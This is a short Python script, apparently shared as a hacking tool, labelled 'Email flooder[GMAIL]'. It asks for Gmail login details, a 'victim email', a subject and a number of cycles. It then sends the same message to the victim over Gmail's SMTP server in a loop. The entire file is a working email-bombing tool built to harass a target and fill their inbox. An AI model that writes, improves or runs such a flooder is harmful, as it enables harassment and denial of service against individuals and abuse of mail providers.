from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from colorama import Fore, Back, Style
from getpass import getpass
from smtplib import SMTPAuthenticationError
import random


HELLO = (Fore.RED + 'Email flooder[GMAIL]\n' + Fore.GREEN + ' By forvst3n\n' + Fore.BLUE + '  Version - 0.1')
print(HELLO)

message = str(input(Fore.YELLOW + 'Input message: '))
msg_from = str(input('Input your email: '))
password = getpass(Fore.RED + 'Input password: ')
msg_to = str(input(Fore.YELLOW + 'Input victim email: '))
theme_of_post = str(input('Input theme of post: '))
number_of_cycles = int(input(Fore.GREEN + 'Input number of cycles: '))


def send():
    try:
        if '@' in msg_from and '@' in msg_to:
            msg = MIMEMultipart()
            msg['From'] = msg_from
            msg['To'] = msg_to
            msg['Subject'] = theme_of_post
            for i in range(1,number_of_cycles + 1):
                msg.attach(MIMEText(message, 'plain'))
                server = smtplib.SMTP('smtp.gmail.com: 587')
                server.starttls()
                server.login(msg['From'], password)
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                print(Fore.CYAN + f'Message №{i},send!')
            server.quit()
            print(Fore.RED + '!')
            input('PRESS ENTER')
        else:
            print(Fore.RED + 'Invalid data!')
            print('!')
            input('PRESS ENTER')
    except SMTPAuthenticationError:
        print(Fore.RED + 'Invalid data!')
        print('!')
        input('PRESS ENTER')

send()

